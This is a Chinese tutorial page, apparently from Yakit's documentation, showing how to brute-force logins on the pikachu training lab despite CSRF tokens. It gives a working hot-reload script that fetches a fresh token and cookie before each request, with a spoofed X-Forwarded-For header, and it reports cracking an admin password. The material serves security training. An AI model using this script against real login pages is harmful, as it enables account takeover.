---
sidebar_position: 18
---

# 九、热加载场景案例：csrf token保护下的爆破
这篇文章我们将会介绍一个热加载的实际应用案例：csrf token保护下的爆破。我们以pikachu靶场为例，安装pikachu靶场后(**记得要初始化**)，我们打开如下页面：
![](/img/products/yakit/Fuzz-hotpatch-example1/1.png)

任意输入账号密码之后，使用 yakit 的 MITM 模块拦截登录请求，我们可以看到请求如下：
![](/img/products/yakit/Fuzz-hotpatch-example1/2.png)

注意到除了用户和密码之外，还存在一个token的post参数，这是一个csrf token，它主要是用来防止CSRF攻击的，但是这也给我们的爆破增加了一定的难度，因为每次爆破都需要使用一个新的token。那么在这种情况下我们应该如何爆破呢？

首先我们应该来看看token是从哪里获取的，我们继续使用 yakit 的 MITM 模块拦截请求，这次我们拦截的是直接访问该页面的GET请求，当我们将其发送到 Web FUzzer 发送请求后，可以看到其响应中存在token：
![](/img/products/yakit/Fuzz-hotpatch-example1/3.png)

接下来就是让热加载出手了。我们很容易想到热加载中的"魔术"方法：`beforeRequest`。我们可以在请求发送前，再次发送一个GET请求来获取token值，再用这个值进行爆破，就可以绕过csrf token的保护了。

我们来看看如何实现，首先我们需要在热加载页面中编写热加载内容，代码如下：
```go
beforeRequest = func(req) {
// 发送GET请求，获取响应
rsp, _, err = poc.HTTP(`GET /vul/burteforce/bf_token.php HTTP/1.1
Host: 7f893460-c83a-4bce-83c7-d325ff9b65ba.node4.buuoj.cn:81
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
Cache-Control: max-age=0
Referer: http://7f893460-c83a-4bce-83c7-d325ff9b65ba.node4.buuoj.cn:81/vul/csrf/csrfget/csrf_get_login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
X-Forwarded-For: 127.0.0.1
x-forwarded-for: 127.0.0.1
`)
if err != nil {
    return req
}
// 获取GET响应的Set-Cookie
cookie = poc.GetHTTPPacketHeader(rsp, "Set-Cookie")
node, err = xpath.LoadHTMLDocument(rsp)
if err != nil {
    return req
}
// 通过xpath语法获取token的值
tokenNode = xpath.FindOne(node, "//input[@name='token']")
if tokenNode == nil {
    return req
}
token = xpath.SelectAttr(tokenNode, "value")
// 替换token
req = req.ReplaceAll("__TOKEN__", token)
// 替换cookie
req = poc.AppendHTTPPacketHeader(req, "Cookie", cookie)
return req
}
```
这里我们一共做了以下几件事情：
1. 通过GET请求，拿到响应
2. 通过响应拿到Set-Cookie的值
3. 通过xpath语法获取token的值
4. 替换`__TOKEN__`为实际的token
5. 添加POST请求的Cookie为第二步中拿到的Set-Cookie，这样模拟了多个用户同时请求的情况


我们将token参数改为`__TOKEN__`，然后点击**发生请求**按钮，如图所示，显示`username or password is not exists～`而不是`csrf token error`，这证明我们已经成功获取到token了：
![](/img/products/yakit/Fuzz-hotpatch-example1/4.png)

接下来就很简单了，使用我们前面学到的 fuzztag 知识，使用 fuzztag 爆破密码，成功爆破出了admin的密码为123456：
![](/img/products/yakit/Fuzz-hotpatch-example1/5.png)

需要注意的是，我们使用了并发的技术来请求该网站，这也是我们为什么需要先从GET请求的响应中拿到Set-Cookie然后再设置POST请求的Cookie的原因，因为我们需要模拟多个用户同时请求的情况，如果是单个用户请求的话，我们需要将并发改为1。